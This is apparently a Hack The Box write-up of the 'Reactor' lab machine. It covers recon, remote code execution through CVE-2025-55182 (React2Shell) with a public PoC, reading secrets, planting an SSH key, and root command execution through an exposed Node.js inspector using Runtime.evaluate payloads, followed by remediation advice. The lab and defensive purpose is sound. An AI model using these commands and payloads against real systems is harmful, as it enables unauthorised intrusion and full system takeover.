---
title: "HTB Reactor Writeup"
summary: "Linux writeup covering web application analysis, Node.js debugging exposure, and privilege escalation."
date: 2026-06-05
tags:
  - htb
  - linux
  - web
  - nodejs
  - debugging
  - recon
category: "hack-the-box"
difficulty: "medium"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png"
draft: false
---
## Challenge Information

|Field|Value|
|---|---|
|Machine|Reactor|
|Platform|Hack The Box|
|Target IP|`[REDACTED_TARGET_IP]`|
|Difficulty|Medium / Hard|
|Initial Foothold|CVE-2025-55182 / React2Shell|
|Privilege Escalation|Exposed local Node.js inspector running as root|
|User Flag|`[REDACTED_FLAG]`|
|Root Flag|`[REDACTED_FLAG]`|

---

## 1. Reconnaissance

A full TCP port scan was performed against the target.

```bash
export TARGET=[REDACTED_TARGET_IP]

sudo nmap -Pn -sS -sV -sC -p- --min-rate 3000 "$TARGET" -oN scans/full_new_target.txt
```

Only two ports were exposed:

```text
22/tcp    open  ssh
3000/tcp  open  http/Next.js
```

A targeted scan confirmed that common OPC-UA ports were not externally exposed.

```bash
sudo nmap -Pn -sS -sV \
-p22,80,443,3000,4840,4841,4842,49320,53530,62541 \
"$TARGET" -oN scans/targeted_new_target.txt
```

The result showed that OPC-UA ports such as `4840/tcp` and `62541/tcp` were closed externally. This indicated that the exposed web service on port `3000` was the correct initial attack surface.

---

## 2. Web Service Identification

The application on port `3000` returned a ReactorWatch dashboard.

```bash
export URL="http://[REDACTED_TARGET_IP]:3000"

curl -i "$URL/"
```

Important response indicators:

```http
X-Powered-By: Next.js
x-nextjs-cache: HIT
x-nextjs-prerender: 1
Content-Type: text/html; charset=utf-8
```

The page source contained Next.js static assets:

```html
/_next/static/chunks/...
self.__next_f.push(...)
```

This showed that the target was using **Next.js App Router** with **React Server Components**.

The downloaded client bundle revealed the exact Next.js version:

```bash
grep -Rni 'window.next={version' web/_next
```

Result:

```javascript
window.next={version:"15.0.3",appDir:!0}
```

The React version was also exposed inside the JavaScript bundle:

```text
t.version="19.0.0-rc-66855b96-20241106"
```

Summary:

```text
Framework : Next.js App Router
Next.js   : 15.0.3
React     : 19.0.0-rc-66855b96-20241106
RSC       : Enabled
```

---

## 3. Vulnerability Identification

The identified stack matched the affected class for **CVE-2025-55182**, also known as **React2Shell**.

|Field|Value|
|---|---|
|CVE|CVE-2025-55182|
|Alias|React2Shell|
|Related Next.js Advisory|CVE-2025-66478|
|Severity|Critical|
|CVSS|10.0|
|CWE|CWE-502: Deserialization of Untrusted Data|
|Impact|Pre-authentication remote code execution|
|Affected Component|React Server Components / Server Function payload decoding|
|Target Status|Vulnerable by version and confirmed by probe|

The target used Next.js `15.0.3`, while the patched Next.js 15.0.x release is `15.0.5`.

---

## 4. React2Shell Vulnerability Confirmation

A public React2Shell detector was cloned and used against the target.

```bash
cd ~/Desktop/Hack\ The\ Box/Machines/Reactor

git clone https://github.com/nehkark/CVE-2025-55182.git
cd CVE-2025-55182

python3 -m venv venv
source venv/bin/activate
pip install requests

python3 NextJs.py -u http://[REDACTED_TARGET_IP]:3000
```

The detector confirmed that the target was likely vulnerable:

```text
=== React2Shell Probe ===
  - Benign React Flight gadget executed and returned marker digest.
  - This strongly suggests React2Shell / CVE-2025-55182 style vulnerability.

HTTP status : 500
Digest      : REACT2SHELL_PROBE
Verdict     : LIKELY_VULNERABLE
```

---

## 5. Initial Foothold as `node`

The RCE PoC was used to execute basic commands.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 -c "id"
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 -c "whoami"
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 -c "hostname"
```

Output:

```text
uid=999(node) gid=988(node) groups=988(node)

node

reactor
```

This confirmed remote command execution as the low-privileged `node` user.

---

## 6. Local Enumeration

Because the PoC sometimes broke multiline output, command output was base64-encoded before being returned.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c 'sh -c "pwd; id; ls -la /opt/reactor-app" | base64 -w0'
```

Decoded output:

```text
/opt/reactor-app
uid=999(node) gid=988(node) groups=988(node)

total 76
drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
-rw-r--r--  1 node node   276 Dec 28 21:05 .env
drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
```

The `.env` file was then read.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c 'cat /opt/reactor-app/.env | base64 -w0'
```

Decoded `.env`:

```text
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=[REDACTED_API_KEY]
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

Important values:

```text
DB_PATH=/opt/reactor-app/reactor.db
SENSOR_API_KEY=[REDACTED_API_KEY]
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
```

The SQLite database tables were listed.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c 'sh -c "sqlite3 /opt/reactor-app/reactor.db .tables" | base64 -w0'
```

Decoded result:

```text
sensor_logs  users
```

The schema was dumped.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c 'sh -c "sqlite3 /opt/reactor-app/reactor.db .schema" | base64 -w0'
```

Decoded schema:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);

CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
);
```

---

## 7. Discovery of Local Root Node Inspector

Local listening services were enumerated.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c 'sh -c "ss -tulpen"'
```

Important output:

```text
tcp LISTEN 0 511 127.0.0.1:9229 0.0.0.0:* cgroup:/system.slice/uptime-monitor.service
tcp LISTEN 0 511 *:3000 *:* users:(...)
```

The process list confirmed that the service on port `9229` was a root-owned Node.js process using the Node inspector.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c 'ps auxww | grep -E "node|uptime|reactor"'
```

Output:

```text
node  1394  ... next-server (v15.0.3)
root  1396  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

This was the privilege escalation path.

The Node inspector endpoint was queried from the target itself.

```bash
python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c 'curl -s http://127.0.0.1:9229/json/list | base64 -w0'
```

Decoded result:

```json
[
  {
    "description": "node.js instance",
    "id": "6c505617-d686-4f11-88a3-f36a09fd8635",
    "title": "/opt/uptime-monitor/worker.js",
    "type": "node",
    "url": "file:///opt/uptime-monitor/worker.js",
    "webSocketDebuggerUrl": "ws://127.0.0.1:9229/6c505617-d686-4f11-88a3-f36a09fd8635"
  }
]
```

The debugger WebSocket URL was:

```text
ws://127.0.0.1:9229/6c505617-d686-4f11-88a3-f36a09fd8635
```

Because the inspector was bound to localhost, it was not reachable externally. A tunnel was needed.

---

## 8. Creating an SSH Tunnel as `node`

An SSH key was generated locally.

```bash
ssh-keygen -t ed25519 -f reactor_node -N ''
```

The public key was added to `/home/node/.ssh/authorized_keys` using the React2Shell RCE.

```bash
PUB=$(cat reactor_node.pub)

python3 poc-cve-2025-55182.py -u http://[REDACTED_TARGET_IP]:3000 \
-c "sh -c 'mkdir -p /home/node/.ssh && echo \"$PUB\" >> /home/node/.ssh/authorized_keys && chmod 700 /home/node/.ssh && chmod 600 /home/node/.ssh/authorized_keys'"
```

A normal SSH shell failed because the `node` account had no interactive shell:

```text
This account is currently not available.
Connection to [REDACTED_TARGET_IP] closed.
```

However, SSH port forwarding still worked using `-N -T`.

```bash
ssh -i reactor_node -N -T \
-L 9229:127.0.0.1:9229 \
-o ExitOnForwardFailure=yes \
node@[REDACTED_TARGET_IP]
```

The tunnel was verified from Kali:

```bash
curl -s http://127.0.0.1:9229/json/list
```

The local request returned the same Node inspector JSON, proving that the tunnel was active.

---

## 9. Privilege Escalation via Node Inspector

`wscat` was used to connect to the tunneled Node inspector WebSocket.

```bash
npx -y wscat -c ws://127.0.0.1:9229/6c505617-d686-4f11-88a3-f36a09fd8635
```

A command was executed inside the root-owned Node process using `Runtime.evaluate`.

```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id').toString()","returnByValue":true}}
```

Output:

```json
{
  "id":1,
  "result":{
    "result":{
      "type":"string",
      "value":"uid=0(root) gid=0(root) groups=0(root)\n"
    }
  }
}
```

This confirmed root command execution.

---

## 10. Reading the Root Flag

The root flag was read through the inspector.

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/[REDACTED_FLAG_PATH]').toString()","returnByValue":true}}
```

Output:

```text
[REDACTED_HASH]
```

Root flag:

```text
[REDACTED_HASH]
```

---

## 11. Reading the User Flag

The `/home` directory was listed.

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('ls /home/').toString()","returnByValue":true}}
```

Output:

```text
engineer
node
```

The user flag location was found.

```json
{"id":10,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('find /home -type f -name [REDACTED_FLAG_PATH] -print 2>/dev/null').toString()","returnByValue":true}}
```

Output:

```text
/home/engineer/[REDACTED_FLAG_PATH]
```

The user flag was read.

```json
{"id":11,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /home/engineer/[REDACTED_FLAG_PATH]').toString()","returnByValue":true}}
```

Output:

```text
[REDACTED_HASH]
```

User flag:

```text
[REDACTED_HASH]
```

---

## 12. Final Attack Chain

```text
1. Port scan found SSH and Next.js on port 3000.
2. Web enumeration identified Next.js 15.0.3 with App Router and React Server Components.
3. The stack matched CVE-2025-55182 / React2Shell.
4. React2Shell detector confirmed vulnerability with digest REACT2SHELL_PROBE.
5. RCE was achieved as the node user.
6. Local enumeration found /opt/reactor-app/.env and reactor.db.
7. ss/ps enumeration revealed a root-owned Node.js inspector on 127.0.0.1:9229.
8. An SSH key was added for the node user.
9. SSH port forwarding exposed the local inspector to Kali.
10. wscat connected to the inspector WebSocket.
11. Runtime.evaluate executed commands in the root Node process.
12. [REDACTED_FLAG_PATH] and [REDACTED_FLAG_PATH] were read.
```

---

## 13. Security Issues Identified

### 13.1 Vulnerable Next.js / React Server Components Stack

The application used Next.js `15.0.3` with React Server Components enabled. This stack was vulnerable to CVE-2025-55182 / React2Shell, allowing pre-authentication remote code execution.

### 13.2 Sensitive Data in Environment File

The `.env` file contained sensitive configuration:

```text
DB_PATH=/opt/reactor-app/reactor.db
SENSOR_API_KEY=[REDACTED_API_KEY]
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
```

### 13.3 Root-Owned Node Inspector Exposed Locally

The root process was started with:

```text
/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Even though it was bound to localhost, it became exploitable after gaining low-privileged code execution and creating a tunnel.

### 13.4 Overprivileged Debug Service

The uptime monitor ran as root while exposing a powerful debugging interface. Node inspector allows arbitrary JavaScript evaluation, which resulted in root command execution.

---

## 14. Remediation

1. Upgrade Next.js to a patched version.

    - For the 15.0.x branch, upgrade to at least `15.0.5`.

2. Upgrade React Server Components packages to patched releases.

    - React RSC packages should be updated according to the official React advisory.

3. Disable Node.js inspector in production.

    - Remove `--inspect`.

    - Never expose debugging interfaces in production services.

4. Do not run monitoring workers as root unless strictly required.

    - Use a dedicated low-privileged service account.

    - Apply systemd hardening options such as:

        - `NoNewPrivileges=true`

        - `PrivateTmp=true`

        - `ProtectSystem=strict`

        - `ProtectHome=true`

5. Protect sensitive environment files.

    - Restrict permissions.

    - Avoid storing long-lived secrets directly in application directories.

6. Rotate leaked secrets.

    - Rotate `SENSOR_API_KEY`.

    - Review and rotate any webhook credentials.


---

## 15. Conclusion

The Reactor machine was compromised through a vulnerable Next.js App Router application using React Server Components. CVE-2025-55182 allowed unauthenticated command execution as the `node` user. Local enumeration then revealed a root-owned Node.js inspector bound to `127.0.0.1:9229`. By adding an SSH key for the `node` user and tunneling the inspector port, root command execution was obtained through the inspector WebSocket.

The compromise chain demonstrates how a web-layer RCE can become full system compromise when local debug services are exposed and run with excessive privileges.
